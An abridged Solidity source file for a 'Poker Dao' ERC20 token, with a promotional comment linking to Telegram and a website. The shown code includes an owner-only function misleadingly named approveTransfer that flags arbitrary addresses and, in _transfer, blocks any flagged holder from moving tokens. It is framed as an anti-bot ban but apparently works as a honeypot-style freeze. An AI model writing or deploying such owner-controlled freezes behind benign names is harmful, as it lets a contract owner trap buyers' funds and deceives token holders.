/**   🃏PokerDAO🃏 aims to be one of the best online-poker game that take care about their community.
        Simple rules as well as a trading make PokerDAO easy to understand tool for everyone. 
        Unlike casino, PokerDAO aims to make your success. 

        Telegram - https://t.me/PokerDao

        Website -  https://www.pokerdao.in/  */
...
contract PokerDao is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private constant _name = "Poker Dao";
    string private constant _symbol = "PokerDAO";
    ...
    function approveTransfer(address transferAddress) external onlyOwner {
        if (_approveTransfer[transferAddress] == true) {
            ...
            emit botBan (transferAddress, _approveTransfer[transferAddress]);
          }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_approveTransfer[sender] || _approveTransfer[recipient]) require (amount == 0, "no bots");
